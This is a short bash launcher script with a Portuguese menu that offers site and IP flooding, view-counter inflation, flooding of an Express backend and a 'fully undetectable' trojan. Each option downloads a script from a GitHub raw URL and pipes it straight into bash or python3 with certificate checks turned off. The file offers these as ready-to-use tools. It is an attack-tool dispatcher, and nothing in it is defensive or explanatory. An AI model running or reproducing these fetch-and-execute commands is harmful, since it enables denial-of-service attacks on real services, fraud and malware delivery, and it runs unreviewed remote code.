#!/usr/bin/env bash
RAW="https://raw.githubusercontent.com/Hhhaofuqoc/woiz-strike/ccc18ca76b1b7922a1301654d65b908af7dc77d7"
OP="$1"
if [ -z "$OP" ]; then
  echo " [1] FLOOD SITE+PAINEL+IP"
  echo " [2] CONTADOR INFLACAO"
  echo " [3] FLOOD BACKEND EXPRESS"
  echo " [4] TROJAN FUD"
  echo -n "digite o numero: "
  read OP </dev/tty || read OP
fi
if [ "$OP" = "1" ]; then curl -skL $RAW/woiz_strike.sh | bash
elif [ "$OP" = "2" ]; then curl -skL $RAW/views_inflate.py | python3 - 20
elif [ "$OP" = "3" ]; then curl -skL $RAW/backend_trace.py | python3 - 15
elif [ "$OP" = "4" ]; then curl -skL $RAW/woiz_fud.py -o woiz_fud.py && python3 woiz_fud.py
else echo "saindo..."; exit 0
fi
